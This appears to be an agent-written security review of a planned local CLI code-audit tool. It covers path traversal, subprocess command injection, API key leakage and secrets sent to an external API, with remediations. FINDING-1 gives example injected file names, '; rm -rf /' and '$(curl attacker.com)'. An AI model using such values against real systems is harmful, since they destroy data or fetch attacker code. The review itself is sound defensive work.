# Security Review: building-audit

**Review type:** Post-XRD Architectural Review
**Reviewer:** Security Agent
**Date:** 2026-04-13
**Input:** PRD (building-audit), cross-project decisions.md
**Note:** XRD in progress. Review based on PRD architecture description.

---

## 1. Threat Surface

`building-audit` is a locally-run CLI tool operated by a single user (Josh). It has no network server, no authentication system, no multi-user access. The threat surface is narrow but non-trivial:

| Surface | Description | Risk Level |
|---------|-------------|------------|
| **File system reads** | Traverses project directories, reads source code, markdown task files, DECISIONS.md, package.json, lockfiles, git history | Medium |
| **Subprocess execution** | May invoke `gitleaks` (Go binary) and potentially ESLint as child processes | High |
| **Anthropic API calls** | Layer 2 sends code snippets, diffs, task file content, and decision text to the Anthropic API | High |
| **API key in environment** | `ANTHROPIC_API_KEY` read from environment variable | Medium |
| **File system writes** | Writes JSON report to a user-specified path (`--output`) | Low |
| **Git operations** | Reads commit history, diffs, file lists via `simple-git` | Medium |
| **CLI argument parsing** | `--milestone`, `--output` accept user-provided strings that become file paths | Medium |

The primary risk categories are: (1) sensitive data leaking to the external API, (2) command injection via subprocess invocation, and (3) the API key leaking into output artifacts.

## 2. Trust Boundary Analysis

### Boundary 1: File System -> Tool (Input)

Data crosses from the local file system into the tool's processing pipeline. The tool reads:
- Source code files (TypeScript/JavaScript ASTs)
- Markdown files (task files, DECISIONS.md, PRD, XRD)
- `package.json` and lockfiles
- Git repository metadata

**Risk:** Path traversal. The `--milestone` flag accepts a directory name (e.g., `m1-nacre-docx-ingestion`). If this value is joined to a base path without validation, a value like `../../etc` could cause the tool to read outside the project directory. Similarly, file paths parsed from task files' `Files` sections (create, modify, do_not_touch arrays) could contain traversal sequences.

**Mitigation required:** Resolve all paths to absolute paths and verify they are within the project root before reading. The `--milestone` value should be validated as a direct child directory name, not an arbitrary path.

### Boundary 2: Tool -> Anthropic API (Output)

Layer 2 sends evidence to the Anthropic API. The PRD specifies that each check gathers candidates and evidence in a code phase, then sends focused prompts with supporting data. The evidence includes:
- Code diffs (before/after for Ghost Refactor)
- Source code snippets (function bodies for Clean Slate Bias, call chains for Performance Critical Path)
- Task file content (What to Build sections, Completed sections)
- Decision text from DECISIONS.md (killed approaches for Deep Heresy, Document Heresy)

**Risk:** Sensitive data exfiltration. Code sent to the API may contain hardcoded secrets, credentials, API keys, database connection strings, or proprietary business logic. The tool's own purpose includes detecting hardcoded secrets (Resource Drain check), but the Layer 2 evidence-gathering phase may send code containing those secrets to the API before the Layer 1 Resource Drain check has flagged them.

**Mitigation required:** The evidence-gathering phase for Layer 2 checks should strip or redact strings matching common secret patterns before sending to the API. At minimum, the tool should run the Resource Drain secret detection (Layer 1) before Layer 2 evidence gathering, and redact any values flagged as secrets from Layer 2 payloads.

### Boundary 3: Tool -> File System (Output)

The tool writes a JSON report to disk. The `--output` flag specifies the path.

**Risk:** Low. The report contains file paths, code locations, descriptions, and suggestions. The `evidence` field in findings may contain code snippets. If those snippets contain secrets, the secrets persist in the report file. Additionally, if `--output` is set to a path outside the project (e.g., a shared directory or a path accessible by other users on a multi-user system), sensitive findings could be exposed.

**Mitigation required:** The report's `evidence` field should not include raw secret values. If a finding is about a hardcoded secret, the evidence should reference the file and line but redact the secret value itself.

### Boundary 4: Tool -> Subprocess (gitleaks, ESLint)

If `gitleaks` is installed, the tool invokes it as a subprocess. The PRD also mentions evaluating ESLint plugins, which may involve programmatic ESLint API usage or subprocess invocation.

**Risk:** Command injection. If file paths or project directory paths are interpolated into shell command strings, a specially-crafted file name or path could inject shell commands. This is the highest-severity subprocess risk.

**Mitigation required:** All subprocess invocations must use array-form arguments (e.g., `child_process.execFile` or `child_process.spawn` with an args array), never string interpolation into a shell command. The `simple-git` library should be reviewed for how it handles paths internally.

## 3. Secrets Management

### ANTHROPIC_API_KEY

**Storage:** Environment variable. This is the correct approach for a CLI tool. The key is not in config files, not in source code, not passed as a CLI argument (which would be visible in process listings).

**Risks:**
1. **Key in error messages.** If the API call fails and the error object includes the request headers (which contain the Authorization header with the key), logging that error to the terminal or including it in the report would leak the key. The Anthropic SDK may include the key in error payloads.
2. **Key in report output.** The `token_usage` field tracks API usage but does not include the key. Verify that no other field (e.g., `error_message` on a failed check) could contain the key.
3. **Key in stack traces.** An unhandled exception during an API call could produce a stack trace that includes the key from the request configuration object.

**Mitigations required:**
- Wrap all API calls in error handling that sanitizes the error before logging or reporting. Strip any string matching the API key pattern from error messages.
- Never log request headers.
- The report's `error_message` field for failed Layer 2 checks must be sanitized to exclude the API key.

### Secrets in Scanned Code

The tool scans for hardcoded secrets (Resource Drain check) and may encounter real secrets in the projects it audits. These secrets could appear in:
- Layer 2 evidence payloads sent to the API
- The report's `evidence` field
- Terminal output for critical findings

**Mitigation required:** When a secret is detected, the finding should include the file path and line number but mask the secret value (e.g., show first 4 and last 4 characters, mask the middle).

## 4. Dependency Risk

| Dependency | Purpose | Risk Assessment |
|------------|---------|-----------------|
| `@typescript-eslint/parser` | AST parsing for TS/JS | **Medium.** Parses untrusted source code. AST parsers are a historically common attack surface (prototype pollution, ReDoS in tokenizers). The typescript-eslint project is actively maintained with a large contributor base. Monitor for CVEs. |
| `unified` / `remark` | Markdown parsing for task files | **Medium.** Parses markdown files which could be adversarial in a supply-chain scenario. The unified ecosystem is mature but has had past vulnerabilities in plugins. Use only the core parser and well-maintained plugins. |
| `simple-git` | Git operations | **High.** Executes git commands as subprocesses. The library's internal command construction is a trust boundary. A vulnerability in `simple-git` that allows command injection through crafted repository data (branch names, file paths, commit messages) would be exploitable. `simple-git` has had CVEs in the past (CVE-2022-25860, CVE-2022-24433 -- command injection via crafted remote URLs and branch names). **The XRD must specify a minimum version of simple-git that patches known injection vulnerabilities.** |
| `gitleaks` (optional) | Secret detection | **Low.** External Go binary invoked as a subprocess. The risk is in how it is invoked (covered in Boundary 4), not in the binary itself. |
| `eslint-plugin-jest` / `eslint-plugin-vitest` | Weak assertion detection | **Low.** Evaluate-and-wrap. These run against parsed ASTs, not raw input. Low attack surface. |
| `depcheck` | Unused dependency detection | **Low.** Reads package.json and source files. Minimal attack surface. |
| `eslint-plugin-sonarjs` | Cognitive complexity | **Low.** AST analysis only. |

**Key dependency risk:** `simple-git` is the highest-risk dependency because it constructs and executes shell commands. Pin to a version that patches all known command injection CVEs. Audit that file paths passed to `simple-git` methods do not include shell metacharacters.

## 5. Data Exposure

### What data leaves the machine

In `--full` mode, Layer 2 sends the following to the Anthropic API:
- Code diffs (potentially large, potentially containing secrets)
- Source code snippets (function bodies, class definitions)
- Task file content (What to Build, Completed sections)
- DECISIONS.md entries (killed approaches, rationale text)
- Component names, file paths, function signatures

This data is sent over HTTPS to the Anthropic API. Anthropic's data retention and usage policies apply.

**Insight:** The tool's Layer 2 evidence-gathering phase is designed to be focused (under 8K tokens per check), which naturally limits the volume of data sent. However, the PRD does not specify any filtering of sensitive content from Layer 2 payloads. A diff that introduces an API key would be sent to the Anthropic API as evidence for the Ghost Refactor check, because the evidence-gathering phase selects candidates by diff size, not content sensitivity.

**Implication:** Layer 1's Resource Drain check (secret detection) must run before Layer 2 evidence gathering. Any file or diff flagged as containing secrets should have those values redacted in Layer 2 payloads. The architecture should enforce this ordering.

### What data appears in the report

The JSON report includes:
- File paths (benign)
- Line numbers (benign)
- Descriptions and suggestions (authored by the tool, benign)
- The `evidence` field (may contain code snippets, diffs, metric values)
- `error_message` fields (may contain API error details)
- `token_usage` (benign)

**Risk:** The `evidence` field is the primary data exposure vector in the report. It is defined as an optional `Record<string, unknown>` with check-specific structure. Without a schema constraint on what goes into `evidence`, any check could dump raw code including secrets.

**Mitigation:** Define a policy that the `evidence` field never contains raw secret values. Checks that reference code containing potential secrets must redact them.

### Terminal output

Critical findings print inline to the terminal. The PRD example shows file paths, line numbers, and descriptions. If a critical finding is about a hardcoded secret, the terminal output should not echo the secret value.

### Logging

The PRD does not describe a logging mechanism beyond terminal output. If logging is added during implementation, it must follow the same redaction rules as terminal output and report output.

## 6. Critical and High Findings

### FINDING-1: Command injection via subprocess invocation [High]

**Category:** Injection
**Severity:** High

**Description:** The PRD specifies wrapping `gitleaks` as an optional subprocess and evaluating ESLint tools that may be invoked as subprocesses. If file paths from the scanned project are interpolated into shell command strings, a file named (for example) `; rm -rf /` or `$(curl attacker.com)` could execute arbitrary commands.

**Evidence:** The PRD lists `gitleaks` as an optional integration (PRD Section 3.2.8, Decision 6). The `simple-git` library has a documented history of command injection CVEs (CVE-2022-25860, CVE-2022-24433).

**Impact:** Arbitrary command execution on Josh's machine. While Josh is the only user and runs this against his own projects, a supply-chain attack that inserts a malicious file name into a dependency or cloned repository could exploit this.

**Remediation:** (1) All subprocess invocations must use `execFile` or `spawn` with an arguments array, never `exec` with string interpolation. (2) Pin `simple-git` to a version >= 3.16.0 that patches known injection CVEs. (3) Validate that file paths passed to any subprocess do not contain shell metacharacters; reject or escape them if they do.

**Gate impact:** Blocks advancement. The XRD must specify subprocess invocation strategy and `simple-git` version pinning.

---

### FINDING-2: Sensitive code and secrets sent to external API without redaction [High]

**Category:** Data Exposure
**Severity:** High

**Description:** Layer 2 sends code diffs, source code snippets, and task file content to the Anthropic API. The evidence-gathering phase selects candidates based on structural criteria (diff size, name similarity, call chain depth) without checking whether the selected code contains secrets. Hardcoded API keys, database credentials, or tokens in the scanned project's source code would be transmitted to an external service.

**Evidence:** PRD Section 3.3 describes the two-phase pattern. The code phase gathers candidates; the LLM phase sends them to the API. No redaction step is described between gathering and sending. PRD Section 3.2.8 (Resource Drain) detects hardcoded secrets, but there is no specified ordering that ensures Resource Drain runs before Layer 2 evidence gathering.

**Impact:** Secrets from the audited project are sent to the Anthropic API. Even though Anthropic's API has data handling policies, transmitting credentials to any external service is a security violation.

**Remediation:** (1) Run Layer 1 secret detection (Resource Drain) before Layer 2 evidence gathering. (2) Maintain a set of flagged secret locations from Layer 1. (3) Before sending any evidence payload to the API, check whether it contains text from flagged locations and redact matching values. (4) As a defense-in-depth measure, apply a regex-based secret pattern scan to all outbound API payloads regardless of Layer 1 results.

**Gate impact:** Blocks advancement. The XRD must specify the ordering of Layer 1 secret detection relative to Layer 2 evidence gathering, and describe the redaction mechanism.

---

## 7. Medium and Low Findings

### FINDING-3: Path traversal via --milestone and --output flags [Medium]

**Category:** Input Validation
**Severity:** Medium

**Description:** The `--milestone` flag accepts a directory name that is resolved relative to the project root. The `--output` flag accepts an arbitrary file path for the report. Neither is described as validated in the PRD. A `--milestone` value containing `../` could cause the tool to read files outside the project directory. A `--output` value could write the report to an unintended location.

**Remediation:** (1) Validate `--milestone` as a simple directory name (no path separators, no `..`). (2) Resolve `--output` to an absolute path and optionally warn if it is outside the project directory. (3) Resolve all file paths used for reading to absolute paths and verify they start with the project root.

---

### FINDING-4: API key leakage in error messages and report output [Medium]

**Category:** Data Exposure
**Severity:** Medium

**Description:** If an Anthropic API call fails, the error object may contain the Authorization header or the API key in request configuration. The PRD specifies that failed Layer 2 checks produce an `error_message` field in the report and that the tool logs API errors to the terminal. If the raw error is used without sanitization, the API key could appear in the report file or terminal output.

**Remediation:** (1) Wrap all Anthropic API calls in error handling that strips the API key from any error message before logging or reporting. (2) Implement a sanitization function that replaces any occurrence of the `ANTHROPIC_API_KEY` value in strings with `[REDACTED]`. (3) Apply this sanitization to the `error_message` field in the report and to all terminal error output.

---

### FINDING-5: simple-git version must be pinned above known CVE thresholds [Medium]

**Category:** Vulnerable Dependencies
**Severity:** Medium

**Description:** `simple-git` has documented command injection vulnerabilities in versions prior to 3.16.0. The PRD lists it as a core dependency but does not specify a minimum version.

**Remediation:** Pin `simple-git` to >= 3.16.0 in `package.json`. Add a note in the XRD's dependency section.

---

### FINDING-6: Report evidence field may contain secrets from audited projects [Medium]

**Category:** Data Exposure
**Severity:** Medium

**Description:** The `evidence` field in findings is typed as `Record<string, unknown>` with no schema constraints. Checks that attach code snippets or diffs to the evidence field could include hardcoded secrets from the audited project. The report file persists on disk and could be shared, committed, or uploaded.

**Remediation:** (1) Define a policy that `evidence` fields never contain raw secret values. (2) When a check attaches code to the `evidence` field, apply the same secret redaction used for Layer 2 payloads. (3) Document in the report schema that `evidence` is redacted.

---

### FINDING-7: No auth/authz assessment needed [Low / Informational]

**Category:** N/A
**Severity:** Informational

**Description:** This tool has no authentication or authorization system. It is a single-user local CLI. No auth/authz assessment is applicable. This is noted for completeness per the security agent output contract.

---

### FINDING-8: Token batching could amplify data exposure [Low]

**Category:** Data Exposure
**Severity:** Low

**Description:** The PRD specifies that if a Layer 2 check's evidence exceeds 8K tokens, it is split into batches. Batching means the same evidence (code, diffs) is sent across multiple API calls, increasing the total volume of data transmitted. The batching mechanism should maintain the same redaction guarantees as single-payload checks.

**Remediation:** Apply the same secret redaction to each batch payload, not just the aggregate evidence before splitting.

---

## Summary

| Severity | Count | Gate Impact |
|----------|-------|-------------|
| Critical | 0 | -- |
| High | 2 | Both block advancement |
| Medium | 4 | Log with remediation; create fix tasks |
| Low / Info | 2 | Logged |

**High findings requiring resolution before the XRD advances:**

1. **FINDING-1:** Subprocess invocation must use array-form arguments; `simple-git` must be pinned above known CVE versions.
2. **FINDING-2:** Layer 1 secret detection must run before Layer 2 evidence gathering; outbound API payloads must be redacted for secrets.

**Tier 3 items:** None. All findings have clear remediation paths that do not require product judgment.
